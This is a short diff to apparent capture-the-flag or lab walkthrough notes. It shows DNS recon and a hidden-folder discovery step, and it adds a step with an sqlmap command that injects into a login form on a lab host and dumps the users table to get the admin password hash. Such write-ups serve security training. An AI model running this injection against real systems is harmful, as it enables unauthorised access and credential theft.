@@ -10,3 +10,7 @@ dnsrecon -r 10.13.37.10/24 -n 10.13.37.10
 ![[Pasted image 20230913120254.png]]
 3) Analyze the web traffic to find the hidden folder
 ![[Pasted image 20230913120456.png]]
+4)Use sqlmap to retrieve the admin hash
+```bash
+sqlmap -u 'http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php' --batch --forms --level 3 --risk 3 -D jetadmin -T users --dump
+```
